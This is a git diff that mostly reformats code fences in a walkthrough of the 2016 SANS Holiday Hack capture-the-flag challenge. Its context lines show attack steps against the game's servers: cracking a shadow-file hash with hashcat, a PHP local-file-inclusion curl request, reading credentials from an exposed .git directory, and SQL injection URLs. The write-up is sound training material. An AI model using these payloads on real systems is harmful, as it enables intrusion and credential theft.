@@ -28,7 +28,8 @@ An APK file is inside the ZIP file and it is password protected. Using the secre
 ### 3) What username and password are embedded in the APK file?
 
 Using apktool, the APK was decompiled. A simple grep of all .smali files reveals a username and password in the b.smali and SplashScreen.smali
-```
+
+``` bash
 $ grep 'password' *
 b.smali:    const-string v1, "password"
 Login$3$1$1.smali:    const-string v1, "We\'ve sent you an email to reset your password!"
@@ -67,7 +68,8 @@ The file was found in SantaGram_4.2/res/raw
 ### 5) What is the password for the "cranpi" account on the Cranberry Pi system?
 
 Gather information on the partitions available in the cranbian image.
-```
+
+``` bash
 root@6333f0f60bf6:~/hhc$ fdisk -l cranbian-jessie.img
 
 Disk cranbian-jessie.img: 1.3 GiB, 1389363200 bytes, 2713600 sectors
@@ -83,7 +85,8 @@ cranbian-jessie.img2      137216 2713599 2576384  1.2G 83 Linux
 ```
 
 Extract the second partition using dd to obtain an ext4 image and mount it. fsck was required before it would let me mount the image.
-```
+
+``` bash
 $ dd bs=70254592 if=cranbian-jessie.img of=cranbian-ext skip=1
 $ losetup /dev/loop2 cranbian-ext
 $ fsck /dev/loop2
@@ -92,7 +95,7 @@ $ mount /dev/loop2 /mnt/
 
 Grab the /etc/passwd and /etc/shadow file.
 
-```
+``` bash
 root@6587a3e5f040:/mnt/etc# cat passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -157,7 +160,6 @@ cranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEh
 Crack the password of the cranpi account using hashcat and the wordlist from a hint provided by 1 of the elves in game!
 
 {% include image name="minty-candycane.png" caption="Minty Candycane: RockYou password list" %}  
-  
 
 ```
 > E:\Tools\hashcat-3.20\hashcat64.exe -m 1800 -a 0 "Part 3\hash.txt" E:\Tools\hashcat-3.20\wordlists\rockyou.txt
@@ -179,7 +181,7 @@ Santa was found in DFER in 1978 (The terminal door with the wumpus game, after g
 
 Scratchy was a tricky terminal. The trick lies in the commands `sudo` and `strings`.
 
-```
+``` bash
 scratchy@cbbeb93495e5:/$ sudo -l
 sudo: unable to resolve host cbbeb93495e5
 Matching Defaults entries for scratchy on cbbeb93495e5:
@@ -191,7 +193,8 @@ User scratchy may run the following commands on cbbeb93495e5:
 ```
 
 Part 1:
-```
+
+``` bash
 scratchy@8956a10a16f1:/$ sudo -u itchy strings /out.pcap
 ...snip...
 <input type="hidden" name="part1" value="santasli" />
@@ -199,7 +202,8 @@ scratchy@8956a10a16f1:/$ sudo -u itchy strings /out.pcap
 ```
 
 Part 2:
-```
+
+``` bash
 scratchy@b5d698c4390e:/$ sudo -u itchy strings -e l /out.pcap 
 sudo: unable to resolve host b5d698c4390e
 part2:ttlehelper
@@ -246,7 +250,7 @@ Key: LOOK AT THE PRETTY LIGHTS
 
 A simple `find` will locate the key for the door. 
 
-```
+``` bash
 elf@a7ba94688298:~$ find . -type f
 ./.bashrc
 ./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt
@@ -270,12 +274,14 @@ Key: open_sesame
 **Cheat:**
 
 1. Hex dump wumpus to extract binary to my own machine
-```
+
+``` bash
 $ od -A x -t x1 -v wumpus
 ```
 
 2. Patch the 'shoot' function: `jne to je`  
 Modified assembly instructions:
+
 ```
 0x0040177c      0f847e020000   je 0x401a00
 0x00401a0a      740f           je 0x401a1b
@@ -318,7 +324,7 @@ We'll first start with NMAP on dungeon.northpolewonderland.com
 
 NMAP discovered port: Discovered open port 11111/tcp on 35.184.47.139
 
-```
+``` bash
 $ nc dungeon.northpolewonderland.com 11111
 Welcome to Dungeon.                     This version created 11-MAR-78.
 You are in an open field west of a big white house with a boarded
@@ -335,7 +341,7 @@ There's an elf that mentioned having an old version of the dungeon game, which I
 
 I searched around for walkthroughs or hints on playing the game. Here's how you can get the instructions for this version of the game:
 
-```
+``` bash
 Welcome to Dungeon.                     This version created 11-MAR-78.
 You are in an open field west of a big white house with a boarded
 front door.
@@ -364,7 +370,8 @@ There are several commands available to the [GDT](http://gunkies.org/wiki/Zork_h
 - TK allows you to take any item in the game
 
 I created a python script to generate the steps to travel to all possible rooms in the game (from 1 to 255):
-```python
+
+``` python
 for room_num in range(1,255):
 	print 'GDT'
 	print 'AH'
@@ -374,12 +381,14 @@ for room_num in range(1,255):
 ```
 
 Fed the generated steps into the game:
-```
+
+``` bash
 $ python steps_generator.py
 $ ./dungeon < steps_generator.py
 ```
 
 Discovered the room 191 and 192, the north pole:
+
 ```
 >GDT
 GDT>AH
@@ -401,6 +410,7 @@ The elf is facing you keeping his back warmed by the fire.
 ```
 
 Seems like the elf wants something from us. Using the same method I got a list of all items in game and found that the elf wanted the gold card. Replicating this in the online version:
+
 ```
 >GDT
 GDT>TK
@@ -424,7 +434,7 @@ To get the POST request body for this challenge, I installed and played with the
 
 The request should look something like :
 
-```http
+``` http
 POST /index.php HTTP/1.1
 Content-Type: application/json
 User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)
@@ -438,7 +448,7 @@ Content-Length: 161
 
 And the response like this:
 
-```json
+``` json
 {
     "date": "20161218131022", 
     "request": {
@@ -458,7 +468,7 @@ And the response like this:
 
 Notice the *verbose* parameter and its value *false*, what would happen if we were to add that parameter to our request and change the value to true?
 
-```http
+``` http
 POST /index.php HTTP/1.1
 Content-Type: application/json
 User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)
@@ -472,7 +482,7 @@ Content-Length: 161
 
 Response:
 
-```json
+``` json
 {
     "date": "20161218131022", 
     "request": {
@@ -504,7 +514,8 @@ Response:
 ```
 
 Now just download the mp3 file:
-```
+
+``` bash
 $ wget http://dev.northpolewonderland.com/debug-20161224235959-0.mp3
 ```
 
@@ -535,7 +546,7 @@ The `crashdump` parameter in `ReadCrashDump` is vulnerable to PHP local file inc
 
 We can view the source of the exception.php page by making the following request:
 
-```http
+``` http
 POST /exception.php HTTP/1.1
 Content-Type: application/json
 User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)
@@ -549,11 +560,12 @@ Content-Length: 106
 
 Or in curl:
 
-```
+``` bash
 curl -s -k -X $'POST' -H $'Content-Type: application/json' -H $'User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)' --data-binary $'{\"operation\":\"ReadCrashDump\",\"data\":{\"crashdump\":\"php://filter/convert.base64-encode/resource=exception\"}}' $'http://ex.northpolewonderland.com/exception.php' | base64 -d
 ```
 
 Response:
+
 ``` php
 <?php
 
@@ -569,7 +581,8 @@ if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){
 ```
 
 Download the audio file:
-```
+
+``` bash
 $ wget http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3
 ```
 
@@ -582,7 +595,8 @@ Found `.git` directory: https://analytics.northpolewonderland.com/.git/ after ru
 Install [DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage) and clone the `.git` directory.
 
 Found 'administrator' credentials:
-```
+
+``` bash
 $ git log
 commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
 Author: me <me@example.org>
@@ -591,7 +605,7 @@ Date:   Mon Nov 21 21:15:08 2016 -0800
 	Fix database dump
 ```
 
-```
+``` bash
 $ git diff-tree -p 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
 ...snip...
 -INSERT INTO `users` VALUES (0,'administrator','KeepWatchingTheSkies'),(1,'guest','busyllama67');
@@ -605,15 +619,16 @@ Digging through the source code obtained from the downloaded git repository, the
 The Query (query.php) page is used to query reports with an optional feature to save the reports.
 
 query.php
-```php
-    $query = "SELECT * ";
-    $query .= "FROM `app_" . $type . "_reports` ";
-    $query .= "WHERE " . join(' AND ', $where) . " ";
-    $query .= "LIMIT 0, 100";
-	...snip...
-    $result = mysqli_query($db, "INSERT INTO `reports`
-       (`id`, `name`, `description`, `query`)
-	...snip...
+
+``` php
+$query = "SELECT * ";
+$query .= "FROM `app_" . $type . "_reports` ";
+$query .= "WHERE " . join(' AND ', $where) . " ";
+$query .= "LIMIT 0, 100";
+...snip...
+$result = mysqli_query($db, "INSERT INTO `reports`
+   (`id`, `name`, `description`, `query`)
+...snip...
 ```
 
 Looking at the *insert* statement, there are 3 columns: name, description and query. Query stores the *select* statement used for querying the report.
@@ -623,7 +638,8 @@ Looking at the *insert* statement, there are 3 columns: name, description and qu
 Now the Edit page allows one to edit the details of an existing report.
 
 edit.php
-```php
+
+``` php
     $result = mysqli_query($db, "SELECT * FROM `reports` WHERE `id`='" . mysqli_real_escape_string($db, $_GET['id']) . "' LIMIT 0, 1");
     if(!$result) {
       reply(500, "MySQL Error: " . mysqli_error($db));
@@ -645,11 +661,13 @@ edit.php
 The code goes through and updates each column of the *reports* table if the corresponding name and value is found in the GET request.
 
 Here's an example of the default request to edit.php after clicking on 'Edit'
+
 ```
 https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=
 ```
 
 We can modify the value of the 'query' column of the existing report by adding a `query` parameter and value:
+
 ```
 https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=&query=SELECT%20*%20FROM%20`audio`
 ```
@@ -659,21 +677,25 @@ This will let us perform a 'sql injection' attack by querying any data we want b
 Here's how I solved this challenge:
 
 1. Edit the a report's query to view the rows in the *audio* table
+
 ```
 https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=&query=SELECT%20*%20FROM%20`audio`
 ```
 
 2. Now view the report
+
 ```
 https://analytics.northpolewonderland.com/view.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029
 ```
 
 3. To download the mp3, I used the `TO_BASE64()` function
+
 ```
 https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=&query=SELECT%20TO_BASE64(mp3)%20FROM%20`audio`%20limit%201,%201
 ```
 
 4. View and copy base64 of mp3 from the website, then decode the base64 and save the mp3 file
+
 ```
 https://analytics.northpolewonderland.com/view.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029
 ```
